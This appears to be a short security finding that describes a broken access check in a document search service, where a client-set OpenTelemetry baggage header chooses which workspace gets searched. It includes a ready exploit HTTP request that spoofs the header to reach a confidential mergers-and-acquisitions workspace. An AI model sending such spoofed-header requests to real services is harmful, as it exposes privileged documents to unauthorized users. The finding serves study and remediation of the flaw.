diagnosis: The document search endpoint extracts workspace.id from OpenTelemetry baggage to constrain search queries in Elasticsearch. The service blindly trusts client-provided baggage without verifying that the authenticated session is authorized for the target workspace. An attacker can set baggage: workspace.id=ws_legal_confidential to search and retrieve privileged corporate documents.
exploit_request:
POST /api/search/documents HTTP/1.1
Host: search.mesh.corp
Cookie: session_token=standard_employee_cookie
baggage: workspace.id=ws_mergers_acquisitions_2026
Content-Type: application/json

{"query": "acquisition buyout price agreement"}
